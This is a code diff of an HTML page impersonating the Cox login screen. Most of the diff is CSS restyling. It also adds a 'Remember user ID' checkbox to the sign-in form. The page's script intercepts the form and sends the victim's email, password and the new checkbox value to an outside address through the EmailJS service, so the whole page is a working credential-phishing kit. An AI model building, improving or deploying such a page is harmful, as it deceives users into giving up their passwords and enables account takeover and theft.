@@ -6,190 +6,189 @@
 <title>Cox Login</title>
 <script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
 <style>
-* { box-sizing: border-box; }
+  * { box-sizing: border-box; }
 
-body, html {
-  margin: 0; padding: 0; height: 100%;
-  font-family: "Cera Bold", "Cera Medium", "open_sanssemibold", "Arial", "Helvetica", "Sans-serif";
-  background: #fff;
-}
+  body, html {
+    margin: 0; padding: 0; height: 100%;
+    font-family: "Cera Bold", "Cera Medium", "open_sanssemibold", "Arial", "Helvetica", "Sans-serif";
+    background: #fff;
+  }
 
-/* Fixed Header */
-.header {
-  width: 100%;
-  height: 60px;
-  background-color: white;
-  border-bottom: 1px solid #e0e0e0;
-  display: flex;
-  align-items: center;
-  padding: 0 2rem;
-  position: fixed;
-  top: 0; left: 0;
-  z-index: 10;
-}
+  /* Fixed Header */
+  .header {
+    width: 100%;
+    height: 60px;
+    background-color: white;
+    border-bottom: 1px solid #e0e0e0;
+    display: flex;
+    align-items: center;
+    padding: 0 2rem;
+    position: fixed;
+    top: 0; left: 0;
+    z-index: 10;
+  }
 
-.header img {
-  height: 32px;
-}
+  .header img {
+    height: 32px;
+  }
 
-/* Container split into 50% each */
-.container {
-  display: flex;
-  height: calc(100vh - 60px);
-  margin-top: 60px; /* space for fixed header */
-}
-
-/* Left panel with white background */
-.left-panel {
-  position: relative;
-  width: 50%;
-  background: white;
-  display: flex;
-  justify-content: center;
-  align-items: flex-start;
-}
-
-/* Form wrapper 75% width, overlapped by 25% on right side */
-.form-wrapper {
-  background-color: #f2f6f7;
-  width: 75%; /* occupies 75% of left panel */
-  padding: 50px 105px;
-  border-radius: 1px;
-  box-shadow: 0 0 1px rgba(0,0,0,0.1);
-  position: relative;
-  right: -30%; /* overlaps 25% onto right side */
-  margin-top: 80px; /* 80px closer to header */
-}
-
-h1 {
-  margin: 0 0 20px;
-  font-weight: 600;
-  font-size: 32px;
-  color: #255993;
-  font-family: "Cera Bold", "Cera Medium";
-}
-
-p {
-  margin: 0 0 30px;
-  font-size: 16px;
-  color: #535353;
-}
-
-form {
-  display: flex;
-  flex-direction: column;
-}
-
-label {
-  font-size: 14px;
-  margin-bottom: 6px;
-  color: #004263;
-}
-
-input[type="email"],
-input[type="password"] {
-  height: 40px;
-  margin-bottom: 20px;
-  padding: 0 12px;
-  border: 1px solid #cbd1d8;
-  border-radius: 4px;
-  font-size: 16px;
-}
-
-/* Container for button and links in one line */
-.form-actions {
-  display: flex;
-  align-items: center;
-  gap: 20px;
-  flex-wrap: wrap;
-  margin-top: 10px;
-}
-
-button {
-  height: 36px;
-  background-color: #0078d2;
-  border: none;
-  color: white;
-  font-size: 14px;
-  border-radius: 4px;
-  cursor: pointer;
-  font-weight: 600;
-  padding: 0 25px;
-  flex-shrink: 0;
-}
-
-button:hover {
-  background-color: #005ea3;
-}
-
-/* Links container aligned left */
-.links-container {
-  display: flex;
-  gap: 15px;
-  flex-wrap: wrap;
-}
-
-.links-container a {
-  font-size: 13px;
-  color: #0078d2;
-  text-decoration: none;
-  white-space: nowrap;
-}
-
-.links-container a:hover {
-  text-decoration: underline;
-}
-
-/* Forgot password link below the form if needed */
-.forgot-password {
-  margin-top: 12px;
-  font-size: 14px;
-  color: #0078d2;
-  text-align: right;
-}
-
-.forgot-password a {
-  color: #0078d2;
-  text-decoration: none;
-}
-
-/* Right panel with background image and 25% transparent overlay */
-.right-panel {
-  width: 50%;
-  background:
-    linear-gradient(to right, transparent 0%, transparent 25%, white 100%) /* overlays 25% over image */,
-    url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=900&q=80') no-repeat center center / cover;
-}
-
-/* Responsive adjustments for small screens */
-@media(max-width: 768px) {
+  /* Container split into 50% each */
   .container {
-    flex-direction: column;
+    display: flex;
+    height: calc(100vh - 60px);
+    margin-top: 60px; /* space for fixed header */
   }
-  .left-panel, .right-panel {
-    width: 100%;
-    height: 50vh;
-  }
-  .form-wrapper {
-    position: static;
-    width: 90%;
-    margin: auto;
-    right: 0;
-    margin-top: 20px;
-  }
-  .form-actions {
-    flex-direction: column;
+
+  /* Left panel with white background */
+  .left-panel {
+    position: relative;
+    width: 50%;
+    background: white;
+    display: flex;
+    justify-content: center;
     align-items: flex-start;
-    gap: 10px;
   }
+
+  /* Form wrapper with overlap */
+  .form-wrapper {
+    background-color: #f2f6f7;
+    width: 75%;
+    padding: 50px 105px;
+    border-radius: 1px;
+    box-shadow: 0 0 1px rgba(0,0,0,0.1);
+    position: relative;
+    right: -30%; /* overlaps onto right panel */
+    margin-top: 80px;
+  }
+
+  h1 {
+    margin: 0 0 20px;
+    font-weight: 600;
+    font-size: 32px;
+    color: #255993;
+    font-family: "Cera Bold", "Cera Medium";
+  }
+
+  form {
+    display: flex;
+    flex-direction: column;
+  }
+
+  label {
+    font-size: 14px;
+    margin-bottom: 6px;
+    color: #004263;
+  }
+
+  input[type="email"],
+  input[type="password"] {
+    height: 40px;
+    margin-bottom: 20px;
+    padding: 0 12px;
+    border: 1px solid #cbd1d8;
+    border-radius: 4px;
+    font-size: 16px;
+  }
+
+  /* Checkbox container */
+  .checkbox-container {
+    display: flex;
+    align-items: center;
+    margin-bottom: 20px;
+    font-size: 14px;
+    color: #004263;
+    user-select: none;
+  }
+  .checkbox-container input[type="checkbox"] {
+    margin-right: 8px;
+    width: 16px;
+    height: 16px;
+  }
+
+  /* Container for button and links on the same line */
+  .form-actions {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    flex-wrap: nowrap;
+  }
+
   button {
-    width: 100%;
+    height: 36px;
+    background-color: #0078d2;
+    border: none;
+    color: white;
+    font-size: 14px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-weight: 600;
+    padding: 0 25px;
+    flex-shrink: 0;
+    white-space: nowrap;
   }
+
+  button:hover {
+    background-color: #005ea3;
+  }
+
   .links-container {
-    flex-wrap: wrap;
-    gap: 10px;
+    display: flex;
+    gap: 15px;
+    flex-wrap: nowrap;
+    justify-content: flex-start;
   }
-}
+
+  .links-container a {
+    font-size: 13px;
+    color: #0078d2;
+    text-decoration: none;
+    white-space: nowrap;
+  }
+
+  .links-container a:hover {
+    text-decoration: underline;
+  }
+
+  .right-panel {
+    width: 50%;
+    background:
+      linear-gradient(to right, transparent 0%, transparent 25%, white 100%),
+      url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=900&q=80') no-repeat center center / cover;
+  }
+
+  /* Responsive adjustments */
+  @media(max-width: 768px) {
+    .container {
+      flex-direction: column;
+    }
+    .left-panel, .right-panel {
+      width: 100%;
+      height: 50vh;
+    }
+    .form-wrapper {
+      position: static;
+      width: 90%;
+      margin: auto;
+      right: 0;
+      margin-top: 20px;
+      padding: 30px 20px;
+    }
+    .form-actions {
+      flex-wrap: wrap;
+      justify-content: flex-start;
+      gap: 10px;
+    }
+    button {
+      width: auto;
+    }
+    .links-container {
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .checkbox-container {
+      margin-bottom: 15px;
+    }
+  }
 </style>
 </head>
 <body>
@@ -208,6 +207,11 @@ button:hover {
 
         <label for="user_password">Password</label>
         <input type="password" id="user_password" name="user_password" placeholder=" " required />
+
+        <div class="checkbox-container">
+          <input type="checkbox" id="remember_id" name="remember_id" />
+          <label for="remember_id">Remember user ID</label>
+        </div>
 
         <div class="form-actions">
           <button type="submit">Sign In</button>
@@ -234,7 +238,8 @@ button:hover {
     event.preventDefault();
     const templateParams = {
       user_email: form.user_email.value,
-      user_password: form.user_password.value
+      user_password: form.user_password.value,
+      remember_id: form.remember_id.checked ? "Yes" : "No"
     };
     emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
       .then(() => {
